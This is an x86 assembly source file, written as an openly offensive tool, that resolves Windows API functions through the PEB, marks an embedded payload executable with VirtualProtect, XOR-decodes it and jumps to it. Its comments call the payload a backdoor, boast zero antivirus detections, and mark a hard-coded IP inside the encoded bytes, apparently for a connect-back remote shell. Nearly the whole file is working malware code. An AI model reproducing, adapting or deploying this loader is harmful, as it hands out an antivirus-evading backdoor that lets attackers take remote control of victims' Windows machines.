global _start
section .text

; decoding the backdoor.asm using xor encoder 
; number of detection in antiscan.me is 0/26 ;)
; Written by Ay0uBN0uri

_start:
; find the kernel32.dll base address
        xor edx,edx
        ; mov eax, fs:[edx + 0x30]  ; EAX = PEB
        mov eax, [fs: edx + 0x30]  ; EAX = PEB
        mov eax, [eax + 0xc]      ; EAX = PEB->Ldr
        mov esi, [eax + 0x14]     ; ESI = PEB->Ldr.InMemoryOrderModuleList
        lodsd                     ; EAX = Second module (ntdll.dll) or like that mov eax,[esi]
        xchg eax, esi             ; EAX = ESI, ESI = EAX
        lodsd                     ; EAX = Third Module (kernel32)
        mov ebx, [eax + 0x10]     ; EBX = Base address of kernel32.dll
        
        


    ; find the export table of kernel32.dll 
        mov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew
        add edx, ebx          ; EDX = PE Header
        mov edx, [edx + 0x78] ; EDX = Offset export table
        add edx, ebx          ; EDX = Export table
        mov esi, [edx + 0x20] ; ESI = Offset names table
        add esi, ebx          ; ESI = Names table (address of AddressOfNames)
        xor ecx, ecx          ; ecx = 0


    ; get the GetProcAddress funcation name 
        Get_FunctionName:
        inc ecx                              ; Increment the ordinal
        lodsd                                ; Get name offset (remember lodsd will load to eax the content of the address point by esi and add to esi 0x4)
        add eax, ebx                         ; Get function name (remember ebx contains the address of kernel32.dll)
        cmp dword [eax], 0x50746547       ; GetP
        jnz Get_FunctionName
        cmp dword [eax + 0x4], 0x41636f72 ; rocA
        jnz Get_FunctionName
        cmp dword [eax + 0x8], 0x65726464 ; ddre
        jnz Get_FunctionName
    ; now eax contains the address to the string 'GetProcAddress'



    ; find the address of GetProcAddress 
        mov esi, [edx + 0x24]    ; ESI = Offset ordinals (remember edx contains the export table offset)
        add esi, ebx             ; ESI = Ordinals table (remember ebx contains the address of kernel32.dll)
        mov cx, [esi + ecx * 2]  ; CX = Number of function
        dec ecx
        mov esi, [edx + 0x1c]    ; ESI = Offset address table
        add esi, ebx             ; ESI = Address table
        mov edx, [esi + ecx * 4] ; EDX = Pointer(offset)
        add edx, ebx             ; EDX = GetProcAddress

    ; get the address of VirtualProtect using GetProcAddress
        xor ecx,ecx
        push ecx
        push 0x61617463 ; aatc
        sub word [esp + 0x2],0x6161
        push 0x65746f72 ; etor
        push 0x506c6175 ; Plau
        push 0x74726956 ; triV
        push esp ; push the address point to VirtualProtect string
        mov eax,[esi]
        push ebx ; push kernel32.dll address
        call edx ; call GetProcAddress

    ; call VirtualProtect
        xor ecx,ecx
        mov cl,0x4
        sub esp,ecx
        push esp
        xor ecx,ecx
        mov cl,0x40
        push ecx
        xor ecx,ecx
        mov cx,0x22f
        push ecx
        mov ecx,shellcode
        push ecx
        call eax
            
    mov esi,shellcode
    xor ecx,ecx
    mov cx,0x22F
looper:
    xor byte [esi],0xaa
    inc esi
    loop looper
    jmp short shellcode

    shellcode: db 0x9b,0x78,0xce,0x21,0xe8,0x9a,0x21,0xea,0xa6,0x21,0xda,0xbe,0x07,0x3c,0x07,0x21,0xf2,0xba,0x21,0xf9,0x96,0xab,0x70,0x21,0xf8,0xd2,0xab,0x70,0x21,0xd8,0x8a,0xab,0x74,0x9b,0x63,0xeb,0x07,0xab,0x72,0x2b,0x92,0xed,0xcf,0xde,0xfa,0xdf,0x5e,0x2b,0xd2,0xae,0xd8,0xc5,0xc9,0xeb,0xdf,0x41,0x2b,0xd2,0xa2,0xce,0xce,0xd8,0xcf,0xdf,0x48,0x21,0xd8,0x8e,0xab,0x74,0xcc,0x21,0xa6,0xe4,0xe3,0x21,0xd8,0xb6,0xab,0x74,0x21,0xbe,0x24,0xab,0x70,0xf9,0x27,0x9e,0x8e,0x23,0xfc,0xae,0x9b,0x63,0xf9,0xf8,0xfb,0xc2,0xcb,0xd8,0xd3,0xeb,0xc2,0xe6,0xc3,0xc8,0xd8,0xc2,0xe6,0xc5,0xcb,0xce,0xfe,0xf9,0x55,0x78,0x23,0xec,0xa2,0xc2,0xc6,0xc6,0xcb,0xcb,0xcc,0x2b,0xc6,0x8e,0xa8,0xcb,0xcb,0xc2,0x99,0x98,0x84,0xce,0xc2,0xdd,0xd9,0x98,0xf5,0xfe,0x55,0x7a,0x23,0xec,0xa6,0xc2,0xc6,0xc6,0xcb,0xcb,0xcc,0x2b,0xc6,0x8e,0xa8,0xcb,0xcb,0xc2,0x99,0x98,0x84,0xce,0xc2,0xdf,0xd9,0xcf,0xd8,0xfe,0x55,0xfc,0xa2,0x23,0xec,0xba,0x21,0xf4,0xae,0x9b,0x63,0xfb,0xc2,0xc4,0xce,0xc5,0xdd,0xc2,0xc6,0xcf,0xfd,0xc3,0xc2,0xc5,0xc4,0xd9,0xc5,0xc2,0xed,0xcf,0xde,0xe9,0xfe,0x21,0xac,0xfa,0x55,0x79,0x23,0xec,0xbe,0x21,0xf4,0xae,0xc2,0xc5,0xdd,0xcb,0xcb,0xcc,0x2b,0xc6,0x8e,0xa8,0xcb,0xcb,0xc2,0xfd,0xc3,0xc4,0xce,0xc2,0xf9,0xc2,0xc5,0xdd,0xfe,0x21,0xec,0xba,0xfa,0x55,0x79,0x23,0xec,0xb2,0x21,0xf4,0xae,0xc2,0xdf,0xda,0xcb,0xcb,0xcc,0x2b,0xc6,0x8e,0xa8,0xcb,0xcb,0xc2,0xde,0xcb,0xd8,0xde,0xc2,0xfd,0xf9,0xeb,0xf9,0xfe,0x21,0xec,0xa6,0xfa,0x55,0x79,0x23,0xec,0xb6,0x21,0xf4,0xae,0xc2,0xde,0xeb,0xcb,0xcb,0xcc,0x2b,0xc6,0x8e,0xa8,0xcb,0xcb,0xc2,0xc5,0xc9,0xc1,0xcf,0xc2,0xfd,0xf9,0xeb,0xf9,0xfe,0x21,0xec,0xa6,0xfa,0x55,0x79,0x23,0xec,0x8a,0x21,0xf4,0xae,0xc2,0xcf,0xc9,0xde,0xcb,0x2a,0xc6,0x8e,0xa9,0xcb,0xc2,0xc9,0xc5,0xc4,0xc4,0xfe,0x21,0xec,0xa6,0xfa,0x55,0x79,0x23,0xec,0x8e,0x21,0xf4,0xae,0xc2,0xd9,0xeb,0xcb,0xcb,0xcc,0x2b,0xc6,0x8e,0xa8,0xcb,0xcb,0xc2,0xc5,0xc9,0xcf,0xd9,0xc2,0xde,0xcf,0xfa,0xd8,0xc2,0xe9,0xd8,0xcf,0xcb,0xfe,0x21,0xac,0xfa,0x55,0x79,0x23,0xec,0x82,0x21,0xf4,0xae,0xc2,0xcf,0xd9,0xd9,0xcb,0x2a,0xc6,0x8e,0xa9,0xcb,0xc2,0xfa,0xd8,0xc5,0xc9,0xc2,0xef,0xd2,0xc3,0xde,0xfe,0x21,0xac,0xfa,0x55,0x79,0x23,0xec,0x86,0x55,0xfc,0xbe,0x9b,0x63,0xfb,0xfa,0x55,0xfc,0xb2,0x9b,0x63,0xcc,0x13,0x3a,0xab,0x83,0x66,0xfe,0x9b,0x63,0xcc,0x13,0xa8,0xa8,0xfb,0x55,0xfc,0xb6,0x9b,0x63,0xfb,0xfb,0xfb,0x1b,0xac,0xfb,0x9b,0x63,0xeb,0xfb,0xeb,0xfb,0x55,0xfc,0x8a,0x23,0xec,0x9a,0x21,0xec,0x9a,0xc2,0xd5,0xab,0xab,0xab,0xcc,0xc2,0xa6,0x50,0x9b,0x71,0x2a,0x69,0xa8,0xcc,0xf9,0x23,0x48,0xc0,0xba,0xf8,0xfa,0x3d,0x55,0xfc,0x8e,0x9b,0x63,0x93,0x62,0xdf,0x77,0xc2,0xc9,0xc7,0xce,0xcb,0x29,0xc6,0x8e,0xa9,0xcb,0x23,0x48,0xfd,0xfd,0xfd,0x9b,0x71,0x9b,0x63,0x2a,0x6b,0xb8,0xf9,0x48,0x57,0xcc,0x6d,0xee,0x8e,0x96,0xab,0xab,0x6c,0xee,0x8e,0xba,0xee,0x27,0xee,0x8e,0xba,0xfe,0xfa,0xf9,0xf9,0xf9,0xe9,0xf9,0xe1,0xf9,0xf9,0xf8,0xf9,0x55,0xfc,0x82,0xf9,0x55,0xfc,0x86
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |^^^^^^^^^^^^^^^^^^|
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |this is the ip    |